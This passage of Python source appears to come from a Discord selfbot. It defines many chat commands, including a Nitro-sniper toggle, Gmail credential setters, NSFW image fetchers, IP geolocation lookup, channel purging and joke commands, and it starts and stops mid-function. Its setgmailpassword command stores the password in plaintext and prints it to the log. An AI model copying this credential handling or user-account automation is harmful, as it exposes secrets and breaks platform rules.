        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("nitro-sniper")] = boolean
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Nitro sniper has been set to " + boolean)
            embed = discord.Embed(title="NITRO-SNIPER CHANGED",
                                  description=f"Nitro-Sniper is now '{boolean}'. \n Restart the bot in order for changes to take place.",
                                  color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:",
                               description="Expected Exception: Could not edit config \n Console Exception {0}".format(
                                   error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)
    elif boolean == "false":
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("nitro-sniper")] = boolean
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Nitro sniper has been set to " + boolean)
            embed = discord.Embed(title="NITRO-SNIPER CHANGED",
                                  description=f"Nitro-Sniper is now '{boolean}'. \n Restart the bot in order for changes to take place.",
                                  color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:",
                               description="Expected Exception: Could not edit config \n Console Exception {0}".format(
                                   error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def setgmailaccount(ctx, *, newgmail = None):
    await ctx.message.delete()
    commandprint("Command 'setgmailaccount' has been used by " + bot.user.name)
    if newgmail is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a gmail \n"
                                                                     "Example: " + prefix + "setgmailaccount mars@gmail.com", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("gmail-account")] = newgmail
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Gmail account has been set to " + newgmail)
            embed = discord.Embed(title="GMAIL-ACCOUNT CHANGED", description=f"Gmail-Account is now '{newgmail}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def setgmailpassword(ctx, *, newgmailpassword = None):
    await ctx.message.delete()
    commandprint("Command 'setgmailpassword' has been used by " + bot.user.name)
    if newgmailpassword is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a gmail password \n"
                                                                     "Example: " + prefix + "setgmailpassword qwerty123!", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("gmail-password")] = newgmailpassword
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Gmail account password has been set to " + newgmailpassword)
            embed = discord.Embed(title="GMAIL-PASSWORD CHANGED", description=f"Gmail password has been changed. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def lesbian(ctx):
    await ctx.message.delete()
    commandprint("Command 'lesbian' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command()
async def lewd(ctx):
    await ctx.message.delete()
    commandprint("Command 'lewd' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def blowjob(ctx):
    await ctx.message.delete()
    commandprint("Command 'blowjob' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def tits(ctx):
    await ctx.message.delete()
    commandprint("Command 'tits' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def boobs(ctx):
    await ctx.message.delete()
    commandprint("Command 'boobs' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def hentai(ctx):
    await ctx.message.delete()
    commandprint("Command 'hentai' has been used by " + bot.user.name)
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=color)
    embed.set_image(url=res['url'])
    embed.set_footer(text=footer)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def tinyurl(ctx, *, link = None):
    await ctx.message.delete()
    commandprint("Command 'tinyurl' has been used by " + bot.user.name)
    if link is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a link \n"
                                                                     "Example: " + prefix + "tinyurl https://adf.ly/393jf8f8s9ghn", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
            embed = discord.Embed(title="**LINK SHORTENED**", description=f"Your shortened link is {r}", color=color)
            embed = discord.Embed(color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not contact API  / invalid link ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not contact API  / invalid link \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(name='first-message', aliases=['firstmsg', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    commandprint("Command 'firstmessage' has been used by " + bot.user.name)
    try:
        if channel is None:
            channel = ctx.channel
        first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
        embed = discord.Embed(title="**FIRST MESSAGE FOUND**", color=color)
        embed.add_field(name="click to jump \n", value=f"[CLICK]({first_message.jump_url})")
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', Could not find first message".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not find first message \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def topic(ctx):
    await ctx.message.delete()
    commandprint("Command 'topic' has been used by " + bot.user.name)
    try:
        r = requests.get('https://www.conversationstarters.com/generator.php').content
        soup = bs4(r, 'html.parser')
        topic = soup.find(id="random").text
        await ctx.send(topic)
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Error unknown. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def logout(ctx):
    await ctx.message.delete()
    commandprint("Command 'logout' has been used by " + bot.user.name)
    try:
        embed = discord.Embed(title="", description="", color=color, )
        embed.add_field(name="**LOGGING OUT**", value="Contact your host to re-enable the bot", inline=False)
        embed.set_footer(text=footer)
        await ctx.send("", embed=embed, delete_after=deletetimer)
        eventprint("Logging out")
        await bot.logout()
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(pass_context=True)
async def uptime(ctx):
    await ctx.message.delete()
    commandprint("Command 'uptime' has been used by " + bot.user.name)
    try:
        currenttime = time.time()
        difference = int(round(currenttime - start_time))
        text = str(datetime.timedelta(seconds=difference))
        embed = discord.Embed(title="**UPTIME**", description=text, colour=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Error unknown. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def cl(ctx, amount:int = None):
    await ctx.message.delete()
    if amount is None:
        commandprint("Command 'cl' has been used by " + bot.user.name + " but did not specify an integer so the command has been canceled.")
        embed = discord.Embed(colour=errorcolor)
        embed.add_field(name="Error:", value="Please specify an integer")
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        commandprint("Command 'cl' has been used by " + bot.user.name)
        async for msg in ctx.channel.history(limit=amount):
            if msg.author == bot.user:
                try:
                    await msg.delete()
                except Exception as x:
                    pass

@bot.command(pass_context=True)
async def admincl(ctx, limit: int = None):
    await ctx.message.delete()
    commandprint("Command 'admincl' has been used by " + bot.user.name)
    if limit is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a limit \n"
                                                                     "Example: " + prefix + "admincl 10", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    try:
        await ctx.channel.purge(limit=limit)
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: You do not have permissions. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def iplookup(ctx, ipaddress = None):
    await ctx.message.delete()
    commandprint("Command 'iplookup' has been used by " + bot.user.name)
    if ipaddress is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a ip \n"
                                                                     "Example: " + prefix + "iplookup 1.1.1.1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        p = requests.post('http://ip-api.com/json/' + ipaddress)
        if '"status":"success"' in p.text:
            embed = discord.Embed(title=f" __**INFO**__ ",
                                  description=f"IP | **{ipaddress}**\n"
                                              f" Country | **{p.json()['country']}**\n"
                                              f" Country Code | **{p.json()['countryCode']}**\n"
                                              f" Region | **{p.json()['region']}**\n"
                                              f" Region Name | **{p.json()['regionName']}**\n"
                                              f" City | **{p.json()['city']}**\n"
                                              f" Timezone | **{p.json()['timezone']}**\n"
                                              f" Zip | **{p.json()['zip']}**\n"
                                              f" ISP | **{p.json()['isp']}**",
                                  color=color, footer=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        else:
            errorprint("Exception ' {0} ', Invalid IP")
            em = discord.Embed(title="Exception Error:", description="You have entered an invalid ip address.", color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'av' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "avatar @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            format = "gif"
            user = user or ctx.author
            if not user.is_avatar_animated():
                format = "png"
            avatar = user.avatar_url_as(format = format if format != "gif" else None)
            async with aiohttp.ClientSession() as session:
                async with session.get(str(avatar)) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file = discord.File(file, f"Avatar.{format}"))
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User could not be found. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['guildpfp'])
async def guildicon(ctx):
    await ctx.message.delete()
    commandprint("Command 'guildicon' has been used by " + bot.user.name)
    try:
        em = discord.Embed(title=ctx.guild.name, color=color)
        em.set_footer(text=footer)
        em.set_image(url=ctx.guild.icon_url)
        await ctx.send(embed=em, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Command must be used within servers. \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def stream(ctx, *, message = None):
    await ctx.message.delete()
    if message is None:
        commandprint("Command 'stream' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "stream ur mum sleeping", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        commandprint("Command 'stream' has been used by " + bot.user.name + " with a message of '" + message + "'")
        try:
            stream = discord.Streaming(name=message, url=streamurl)
            await bot.change_presence(activity=stream)
            em = discord.Embed(title=f"**STATUS CHANGED**",  description="Your streaming status has been set to **'" + message + "'**",  color=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You already have a custom status. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def watching(ctx, *, message = None):
    await ctx.message.delete()
    if message is None:
        commandprint("Command 'watching' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "watching flairings sleep", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'watching' has been used by " + bot.user.name + " with a message of '" + message + "'")
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=message))
            em = discord.Embed(title=f"**STATUS CHANGED**",  description="Your watching status has been set to **'" + message + "'**",  color=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You already have a custom status. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['playing'])
async def game(ctx, *, message = None):
    await ctx.message.delete()
    if message is None:
        commandprint("Command 'watching' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a game \n"
                                                                     "Example: " + prefix + "game 2k", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'watching' has been used by " + bot.user.name + " with a message of '" + message + "'")
            game = discord.Game(name=message)
            em = discord.Embed(title=f"**STATUS CHANGED**",  description="Your playing status has been set to **'" + message + "'**",  color=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
            await bot.change_presence(activity=game)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You already have a custom status. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def listening(ctx, *, message = None):
    await ctx.message.delete()
    if message is None:
        commandprint("Command 'listening' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a listening \n"
                                                                     "Example: " + prefix + "listening flairings piss", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'listening' has been used by " + bot.user.name + " with a message of '" + message + "'")
            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=message))
            em = discord.Embed(title=f"**STATUS CHANGED**",  description="Your listening status has been set to **'" + message + "'**",  color=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', expected error message sent to users chat".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: You already have a custom status. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def ascii(ctx, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'ascii' has been used by " + bot.user.name)
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "ascii hello", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
            if len('```'+r+'```') > 2000:
                errorprint("Exception ' {0} ', Message over 2000 CHARS long")
                em = discord.Embed(title="Exception Error:", description="Expected Exception: Message is too long \n Console Exception N/A", color=errorcolor)
                await ctx.send(embed=em, delete_after=deletetimer)
                return
            await ctx.send(f"```{r}```")
        except Exception as error:
            errorprint("Exception ' {0} ', Message over 2000 CHARS long".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Message over 2000 CHARS long \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(name='groupleaver', aliases=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def _group_leaver(ctx):
    await ctx.message.delete()
    commandprint("Command 'leaveallgroups' has been used by " + bot.user.name)
    try:
        for channel in bot.private_channels:
            if isinstance(channel, discord.GroupChannel):
                await channel.leave()
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['dong', 'penis', 'cock', 'winky', 'shlong'])
async def dick(ctx, *, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'dick' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "dick @Flairings"
                                                                                            "\n (its huge.)", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            if user is None:
                user = ctx.author
            size = random.randint(1, 15)
            dong = ""
            for _i in range(0, size):
                dong += "="
            em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', User could not be found".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User could not be found. \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['8ball'])
async def _8ball(ctx, *, question = None):
    await ctx.message.delete()
    if question is None:
        commandprint("Command '8ball' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "8ball am i gay?", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command '8ball' has been used by " + bot.user.name + " with a message of '" + question + "'")
            responses = [
                'That is a no from me',
                'It is not looking likely',
                'It is quite possible',
                'That is a definite yes!',
                'Maybe',
                'There is a good chance',
                'LOL NO',
                'yes :)',
                'oh fella, pipe down g. nah lad',
            ]
            answer = random.choice(responses)
            embed = discord.Embed(color=color)
            embed.add_field(name="Question", value=question, inline=False)
            embed.add_field(name="Answer", value=answer, inline=False)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/720348929043988572/722447275561058314/1200px-8-Ball_Pool.svg.png")
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', UNKNOWN".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def gay(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'gay' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "gay @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            format = "gif"
            user = user or ctx.author
            if not user.is_avatar_animated():
                format = "png"
            avatar = user.avatar_url_as(format=format if format != "gif" else None)
            em = discord.Embed(color=color)
            em.set_footer(text=footer)
            em.set_image(url=f"https://some-random-api.ml/canvas/gay?&avatar={avatar}")
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', User not found".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def wasted(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'wasted' has been used by " + bot.user.name)
    if user is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "wasted @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            format = "gif"
            user = user or ctx.author
            if not user.is_avatar_animated():
                format = "png"
            avatar = user.avatar_url_as(format=format if format != "gif" else None)
            em = discord.Embed(color=color)
            em.set_footer(text=footer)
            em.set_image(url=f"https://some-random-api.ml/canvas/wasted?&avatar={avatar}")
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', User not found".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def binarytotext(ctx, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'binarytotext' has been used by " + bot.user.name)
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "binarytotext hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            req = requests.get(f'https://some-random-api.ml/binary?decode={text}')
            embed = discord.Embed(title="", color=color, )
            embed.add_field(name="**BINARY TO TEXT RESULT**", value=f"{req.json()['text']} \n", inline=False)
            embed.set_footer(text=footer)
            await ctx.send("", embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not reach api / not binary".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not reach api / not binary \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def texttobinary(ctx, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'texttobinary' has been used by " + bot.user.name)
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "texttobinary hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            req = requests.get(f'https://some-random-api.ml/binary?text={text}')
            embed = discord.Embed(title="", color=color, )
            embed.add_field(name="**TEXT TO BINARY RESULT**", value=f"{req.json()['binary']} \n", inline=False)
            embed.set_footer(text=footer)
            await ctx.send("", embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not reach api / not binary".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not reach api / not english \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def lyricfinder(ctx, *, title = None):
    await ctx.message.delete()
    commandprint("Command 'lyricfinder' has been used by " + bot.user.name)
    if title is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a title \n"
                                                                     "Example: " + prefix + "lyricfinder number logan paul", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            req = requests.get(f'https://some-random-api.ml/lyrics?title={title}')
            embed = discord.Embed(title="**SONG FINDER**", description=f"{req.json()['lyrics']}", color=color, )
            embed.add_field(name="**TITLE**", value=f"{req.json()['title']} \n", inline=False)
            embed.add_field(name="**AUTHOR**", value=f"{req.json()['author']} \n", inline=False)
            embed.add_field(name="**SOURCE**", value=f"{req.json()['links']} \n", inline=False)
            embed.set_footer(text=footer)
            await ctx.send("", embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Embeds have a maximum character count of 2000".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Embeds have a maximum character count of 2000 \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    await ctx.message.delete()
    commandprint("Command 'tweet' has been used by " + bot.user.name)
    if username is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a username \n"
                                                                     "Example: " + prefix + "tweet Flairings wag1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif message is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "tweet Flairings wag1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            async with aiohttp.ClientSession() as cs:
                async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                    res = await r.json()
                    em = discord.Embed()
                    em.set_image(url=res["message"])
                    await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', UNKNOWN".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

marriedlist = "no one"
@bot.command()
async def marry(ctx, member: discord.User=None):
    await ctx.message.delete()
    if member is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "marry @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            commandprint("Command 'marry' has been used by " + bot.user.name)
            global marriedlist
            if f"{member}" in marriedlist:
                    embed=discord.Embed(title=f"You are already married to this person.", color=color)
                    await ctx.send(embed=embed, delete_after=deletetimer)
                    return
            embed=discord.Embed(title=f"{member} will you marry me?", description="say yes or no", color=color)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', user not found?".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

    def check(m):
        return m.content == "yes" or m.content == "no" and m.channel == ctx.channel

    msg = await bot.wait_for("message", check=check)
    if msg.content == "yes":
        embed=discord.Embed(title=f"{bot.user.name} has married {member}", color=color)
        await ctx.send(embed=embed, delete_after=deletetimer)
        marriedlist = f"{msg.author}"
    else:
        embed=discord.Embed(title=f"{member} has declined", color=color)
        await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command()
async def divorce(ctx):
    await ctx.message.delete()
    commandprint("Command 'divorce' has been used by " + bot.user.name)
    try:
        global marriedlist
        embed=discord.Embed(title=f"You have divorced {marriedlist}", color=color)
        await ctx.send(embed=embed, delete_after=deletetimer)
        marriedlist = "no one"
    except Exception as error:
        errorprint("Exception ' {0} ', user not found?".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def married(ctx):
    await ctx.message.delete()
    commandprint("Command 'married' has been used by " + bot.user.name)
    try:
        global marriedlist
        embed=discord.Embed(title=f"I am married to", description=f"{marriedlist}", color=color)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', UNKNOWN".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: This error is unknown, please contact host \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def reverse(ctx, *, text = None):
    await ctx.message.delete()
    if text is None:
        commandprint("Command 'reverse' has been used by " + bot.user.name + " with no message")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
